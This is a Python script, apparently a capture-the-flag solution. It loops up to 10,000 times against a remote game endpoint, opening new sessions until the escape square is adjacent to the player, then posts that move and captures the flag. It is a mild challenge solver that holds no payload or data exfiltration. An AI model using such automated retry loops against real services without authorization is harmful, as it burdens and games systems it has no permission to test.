import requests
import json
import time


def run_exploit(host, port, max_tries):
    flag = ""
    flag_found = False
    n_tries = 0
    url = "{}:{}/problem".format(host, port)
    while not flag_found and n_tries < max_tries:
        session = requests.Session()
        try:
            n_tries += 1
            session.get(url)
            res = session.get(url)
            data = json.loads(res.text)
            player = data['player']
            escape = data['escape']
            if escape == [player[0]+1, player[1]]:
                res = session.post(url, data={"action": "move_down"})
                flag_found, flag = True, res.text
            elif escape == [player[0]-1, player[1]]:
                res = session.post(url, data={"action": "move_up"})
                flag_found, flag = True, res.text
            elif escape == [player[0], player[1]+1]:
                res = session.post(url, data={"action": "move_right"})
                flag_found, flag = True, res.text
            elif escape == [player[0], player[1]-1]:
                res = session.post(url, data={"action": "move_left"})
                flag_found, flag = True, res.text
        except:
            print("Some exception occurred")
        time.sleep(0.5)
    return flag, n_tries


if __name__ == "__main__":
    host = "http://shotokhan.pythonanywhere.com"
    # host = "http://127.0.0.1"
    port = 80
    # port = 9000
    max_tries = 10000
    result = run_exploit(host, port, max_tries)
    if 'naCTF' in result[0]:
        print("Flag {} found after {} tries".format(result[0], result[1]))
    else:
        print("Max number of tries exceeded")
